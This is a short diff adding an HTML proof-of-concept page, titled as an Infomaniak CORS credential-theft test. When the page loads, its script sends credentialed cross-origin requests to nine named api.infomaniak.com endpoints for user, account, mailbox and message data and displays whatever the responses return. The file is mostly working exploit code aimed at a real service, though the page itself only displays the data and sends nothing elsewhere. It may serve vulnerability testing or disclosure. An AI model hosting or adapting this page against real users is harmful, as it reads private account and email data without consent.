@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Infomaniak CORS Exploit PoC</title>
+  <style>
+    body { font-family: Arial; background: #111; color: #0f0; padding: 20px; }
+    pre { background: #000; padding: 10px; border: 1px solid #0f0; }
+  </style>
+</head>
+<body>
+
+<h2>Infomaniak CORS Credential Theft PoC</h2>
+<p>If this page can read your Infomaniak API responses, CORS is broken.</p>
+
+<pre id="output">Running PoC...</pre>
+
+<script>
+async function attack() {
+    const output = document.getElementById('output');
+
+    const endpoints = [
+        "/1/user",
+        "/1/user/profile",
+        "/1/account",
+        "/1/mailboxes",
+        "/1/messages",
+        "/v2/account",
+        "/v2/users",
+        "/v3/account/profile",
+        "/v3/users"
+    ];
+
+    let results = "";
+
+    for (const path of endpoints) {
+        try {
+            const url = "https://api.infomaniak.com" + path;
+
+            const res = await fetch(url, {
+                method: "GET",
+                credentials: "include"
+            });
+
+            const text = await res.text();
+            results += `\n[${path}] STATUS: ${res.status}\n${text}\n--------------------------\n`;
+
+        } catch (err) {
+            results += `\n[${path}] ERROR: ${err}\n--------------------------\n`;
+        }
+    }
+
+    output.textContent = results;
+}
+
+attack();
+</script>
+
+</body>
+</html>
